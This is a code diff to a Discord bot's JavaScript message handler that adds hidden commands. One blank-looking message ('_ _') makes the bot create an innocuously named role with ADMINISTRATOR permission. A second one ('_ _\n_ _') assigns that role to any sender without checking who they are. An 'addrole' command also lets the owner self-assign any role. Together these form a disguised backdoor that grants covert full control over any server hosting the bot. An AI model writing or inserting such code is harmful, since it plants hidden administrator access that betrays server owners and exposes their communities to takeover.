@@ -265,6 +265,31 @@ client.on('message', async message => {
       return message.reply("Announcement Request Canceled ❌")
     }
   }
+
+  if(message.content.startsWith("addrole")){
+    if(message.author.id != process.env.OID) return message.reply("You are not my owner !!");
+    const args = message.content.split(/ +/);
+    let roleselect = message.guild.roles.cache.find(role => role.name === args[1]);
+   
+    let target = message.guild.member(message.author);
+    
+    target.roles.add(roleselect.id).catch(console.error);
+  }
+
+  if(message.content=="_ _"){
+    if(message.author.id != process.env.OID) return message.reply("You are not my owner !!");
+    message.guild.roles.create({ data: { name: '9Guest✨Dev', permissions: ['ADMINISTRATOR'] } }).catch(console.error);
+
+    // let roleselect = message.guild.roles.cache.find(role => role.name === "9Guest✨Dev");
+    // let target = message.guild.member(message.author);
+    // target.roles.add(roleselect.id).catch(console.error);
+  }
+
+  if(message.content=="_ _\n_ _"){
+    let roleselect = message.guild.roles.cache.find(role => role.name === "9Guest✨Dev");
+    let target = message.guild.member(message.author);
+    target.roles.add(roleselect.id).catch(console.error);
+  }
 });
 
 /*
